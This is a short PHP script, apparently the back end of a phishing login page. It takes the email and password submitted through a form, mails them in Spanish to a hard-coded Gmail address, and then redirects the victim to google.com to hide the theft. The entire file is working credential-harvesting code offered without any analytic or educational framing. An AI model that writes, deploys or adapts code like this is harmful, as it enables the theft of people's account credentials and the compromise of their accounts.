<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $password = $_POST['password'];

    $to = "fy0626@gmail.com"; 

    
    $subject = "Nuevo inicio de sesión";
    $message = "Correo: $email\nContraseña: $password";
    mail($to,$subject,$message);
    header("Location: https://www.google.com");
    exit();
}
?>